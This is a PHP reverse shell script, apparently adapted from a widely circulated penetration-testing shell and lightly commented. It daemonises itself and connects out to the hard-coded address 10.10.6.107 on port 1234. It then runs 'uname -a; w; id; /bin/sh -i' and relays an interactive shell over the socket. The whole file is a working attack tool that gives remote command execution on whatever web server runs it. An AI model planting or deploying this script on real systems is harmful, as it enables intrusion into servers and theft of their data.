<?php
// Log the script execution to 'reverse_log.txt'
file_put_contents('reverse_log.txt', 'Script executed');

// Set script execution time to unlimited
set_time_limit(0);

// Define the target IP address and port for the reverse shell
$ip = '10.10.6.107';  
$port = 1234;          

// Define the chunk size for reading/writing data
$chunk_size = 1234;
$write_a = null;
$error_a = null;

// Define the shell command to execute
$shell = 'uname -a; w; id; /bin/sh -i';

// Initialize daemon and debug flags
$daemon = 0;
$debug = 0;

// Attempt to fork the process to run in the background
if (function_exists('pcntl_fork')) {
    $pid = pcntl_fork();
    
    // Handle fork errors
    if ($pid == -1) {
        printit("ERROR: Can't fork");
        exit(1);
    }
    
    // If in parent process, exit
    if ($pid) {
        exit(0);
    }

    // Attempt to create a new session and become session leader
    if (posix_setsid() == -1) {
        printit("Error: Can't setsid()");
        exit(1);
    }
    // Set daemon flag to true
    $daemon = 1;
} else {
    // Print warning if daemonization fails
    printit("WARNING: Failed to daemonise. This is quite common and not fatal.");
}

// Change working directory to root
chdir("/");

// Set file mode creation mask to 0
umask(0);

// Attempt to open a socket connection to the target IP and port
$sock = fsockopen($ip, $port, $errno, $errstr, 30);

// Handle socket connection errors
if (!$sock) {
    printit("$errstr ($errno)");
    exit(1);
}

// Define the descriptor specifications for proc_open
$descriptorspec = array(
    0 => array("pipe", "r"),  // stdin
    1 => array("pipe", "w"),  // stdout
    2 => array("pipe", "w")   // stderr
);

// Attempt to open a process for the shell command
$process = proc_open($shell, $descriptorspec, $pipes);

// Handle process creation errors
if (!is_resource($process)) {
    printit("ERROR: Can't spawn shell");
    exit(1);
}

// Set non-blocking mode for the pipes and socket
stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

// Log the successful opening of the reverse shell
printit("Successfully opened reverse shell to $ip:$port");

// Infinite loop to handle data transmission between shell and socket
while (1) {
    // Check for socket connection termination
    if (feof($sock)) {
        printit("ERROR: Shell connection terminated");
        break;
    }
    
    // Check for shell process termination
    if (feof($pipes[1])) {
        printit("ERROR: Shell process terminated");
        break;
    }
    
    // Prepare the arrays for stream_select
    $read_a = array($sock, $pipes[1], $pipes[2]);
    $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

    // Read data from the socket and write to the shell's stdin
    if (in_array($sock, $read_a)) {
        if ($debug) printit("SOCK READ");
        $input = fread($sock, $chunk_size);
        if ($debug) printit("SOCK: $input");
        fwrite($pipes[0], $input);
    }

    // Read data from the shell's stdout and write to the socket
    if (in_array($pipes[1], $read_a)) {
        if ($debug) printit("STDOUT READ");
        $input = fread($pipes[1], $chunk_size);
        if ($debug) printit("STDOUT: $input");
        fwrite($sock, $input);
    }

    // Read data from the shell's stderr and write to the socket
    if (in_array($pipes[2], $read_a)) {
        if ($debug) printit("STDERR READ");
        $input = fread($pipes[2], $chunk_size);
        if ($debug) printit("STDERR: $input");
        fwrite($sock, $input);
    }
}

// Close the socket and pipes
fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);

// Close the process
proc_close($process);

// Function to print messages if not running as daemon
function printit ($string) {
    if (!$daemon) {
        print "$string\n";
    }
}
?>
